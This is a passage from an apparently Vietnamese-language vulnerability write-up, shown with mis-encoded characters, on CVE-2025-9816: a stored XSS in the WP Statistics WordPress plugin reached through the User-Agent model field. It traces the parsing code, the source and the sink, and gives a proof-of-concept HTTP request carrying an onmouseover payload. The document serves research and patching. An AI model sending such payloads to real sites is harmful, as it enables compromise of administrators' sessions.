  device: 'smartphone'    # loáº¡i thiáº¿t bá»‹
  models:
    - regex: 'Goly[ _-]([^;/]+) Build'   # láº¥y model trÆ°á»›c "Build"
      model: '$1'
    - regex: 'Goly[ _-]([^;/)]+)(?:[;/)]|$)'  # láº¥y model trÆ°á»›c ; / ) hoáº·c háº¿t chuá»—i
      model: '$1'

# other model
```

`mobile.yml`{: .filepath} chá»©a cÃ¡c regex Ä‘á»ƒ nháº­n diá»‡n thiáº¿t bá»‹ mobile, láº¥y model cá»§a nÃ³.

Sau khi `DeviceDetector` Ä‘Æ°á»£c khá»Ÿi táº¡o trong `__construct` cá»§a class `UserAgentService` thÃ¬ `parse()` Ä‘Æ°á»£c gá»i Ä‘á»ƒ phÃ¢n tÃ­ch cÃº phÃ¡p cá»§a user-agent.

```php
public function parse(): void
{
    if ($this->isParsed()) {
        return;
    }

    $this->parsed = true;

    // skip parsing for empty useragents or those not containing any letter (if no client hints were provided)
    if ((empty($this->userAgent) || !\preg_match('/([a-z])/i', $this->userAgent))
        && empty($this->clientHints)
    ) {
        return;
    }
    // other parse

    $this->parseDevice();
}
```

Náº¿u chÆ°a Ä‘Æ°á»£c `parse (user-agent má»›i)` thÃ¬ thá»±c hiá»‡n parse báº±ng hÃ m `parseDevice()`.

```php
protected function parseDevice(): void
{
    $parsers = $this->getDeviceParsers();

    foreach ($parsers as $parser) {
        $parser->setYamlParser($this->getYamlParser());
        $parser->setCache($this->getCache());
        $parser->setUserAgent($this->getUserAgent());
        $parser->setClientHints($this->getClientHints());

        if ($parser->parse()) {
            $this->device = $parser->getDeviceType();
            $this->model  = $parser->getModel();
            $this->brand  = $parser->getBrand();

            break;
        }
    }
    // other logic
}
```

`parseDevice()` láº¥y cÃ¡c parser Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o trong `__construct` vÃ  gÃ¡n vÃ o `$parsers`

{{< figure src="debug3.png" caption="Debug tab cho biáº¿n $parsers" >}}

Sau Ä‘Ã³ duyá»‡t qua `$parsers`, set cáº¥u hÃ¬nh bao gá»“m cÃ¡c regex trong file `.yml`, náº¿u regex khá»›p tá»©c parse thÃ nh cÃ´ng, gÃ¡n model, device, brand cho `DeviceDetector`

{{< figure src="debug4.png" caption="Debug tab gÃ¡n giÃ¡ trá»‹ cho cÃ¡c tham sá»‘ cá»§a DeviceDetector" >}}

{{< figure src="debug5.png" caption="Debug tab giÃ¡ trá»‹ cá»§a model" >}}

NhÆ° váº­y ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c cÃ¡ch kiá»ƒm soÃ¡t model trÆ°á»›c khi gÃ¡n nÃ³ vÃ o `$visitor` vÃ  thÃªm vÃ o database.

{{< figure src="debug6.png" caption="Debug tab giÃ¡ trá»‹ cá»§a model trong $visitor" >}}

Kiá»ƒm tra **database**:

```sql
mysql> SELECT ID, last_counter, referred, agent, platform, version, device, model FROM wp_statistics_visitor;
+----+--------------+----------+---------------+----------+---------+------------+--------------+
| ID | last_counter | referred | agent         | platform | version | device     | model        |
+----+--------------+----------+---------------+----------+---------+------------+--------------+
| 63 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Google Pixel |
| 64 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Goly payload |
+----+--------------+----------+---------------+----------+---------+------------+--------------+
```

Kiá»ƒm tra trong **UI tab models**:

{{< figure src="ui1.png" caption="Model Ä‘Æ°á»£c hiá»ƒn thá»‹ trong UI tab models" >}}

### Sources & Sinks

**Source:** `User-Agent` header (POST `/wp-json/wp-statistics/v2/hit`) â€” DeviceDetector parse â†’ `getModel()`.
**Sink:** `includes/admin/templates/pages/devices/models.php` â€” `echo $item->model` (khÃ´ng `esc_html()` / `esc_attr()`)

### Flow

1. Attacker gá»­i UA chá»©a payload XSS trong model
2. Model chá»©a payload Ä‘Æ°á»£c lÆ°u trong database
3. Admin má»Ÿ tab models => payload cháº¡y.

## Exploit

### Proof of Concept (PoC)

* Gá»­i request chá»©a XSS payload:

```http
POST /wp-json/wp-statistics/v2/hit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Linux; Android 14; Goly "onmouseover=alert()-" Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36

wp_statistics_hit=1&source_type=home&source_id=0&search_query=&signature=787b07b8979cb982ec89a4f103a68081&endpoint=hit&referred=&page_uri=Lw%3D%3D
```

* Admin truy cáº­p endpoint vÃ  hover vÃ o model chá»©a payload:

```
http://localhost/wp-admin/admin.php?page=wps_devices_page&tab=models
```

{{< figure src="result.png" caption="Result â€” PoC execution screenshot" >}}

> DÃ¹ng `"` Ä‘á»ƒ Ä‘Ã³ng title, táº¡o alert() thÃ´ng qua sá»± kiá»‡n **onmouseover** vÃ¬ Ä‘Ã¢y lÃ  tháº» `<span>`, `-` Ä‘Ã¹ng Ä‘á»ƒ ná»‘i chuá»—i trong JavaScript trÃ¡nh Ä‘Æ°á»£c lá»—i cÃº phÃ¡p

## Conclusion

Lá»— há»•ng **CVE-2025-9816** trong plugin **WP Statistics <= 14.15.4** cho phÃ©p **Stored XSS** thÃ´ng qua giÃ¡ trá»‹ `model` láº¥y tá»« header `User-Agent`. Payload Ä‘Æ°á»£c lÆ°u vÃ o DB vÃ  hiá»ƒn thá»‹ trong trang quáº£n trá»‹ **Device Models** mÃ  khÃ´ng escape Ä‘Ãºng cÃ¡ch. Báº£n vÃ¡ **14.15.5** Ä‘Ã£ thÃªm `esc_html()`/`esc_attr()` khi in ra HTML.

**Key takeaways**:

* **Stored XSS** nguy hiá»ƒm hÆ¡n reflected vÃ¬ tá»“n táº¡i lÃ¢u dÃ i trong DB.
* Dá»¯ liá»‡u Ä‘áº¿n tá»« **HTTP headers** cÅ©ng cáº§n Ä‘Æ°á»£c coi nhÆ° input khÃ´ng tin cáº­y.
* LuÃ´n **escape khi output** thay vÃ¬ chá»‰ sanitize khi input.
* **Update plugin** lÃªn báº£n má»›i nháº¥t Ä‘á»ƒ ngÄƒn cháº·n khai thÃ¡c.

## References

[Cross-site scripting (XSS) cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress WP Statistics <= 14.15.4 - CVE-2025-9816](https://patchstack.com/database/wordpress/plugin/wp-statistics/vulnerability/wordpress-wp-statistics-plugin-14-5-4-unauthenticated-stored-cross-site-scripting-via-user-agent-header-vulnerability)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/  

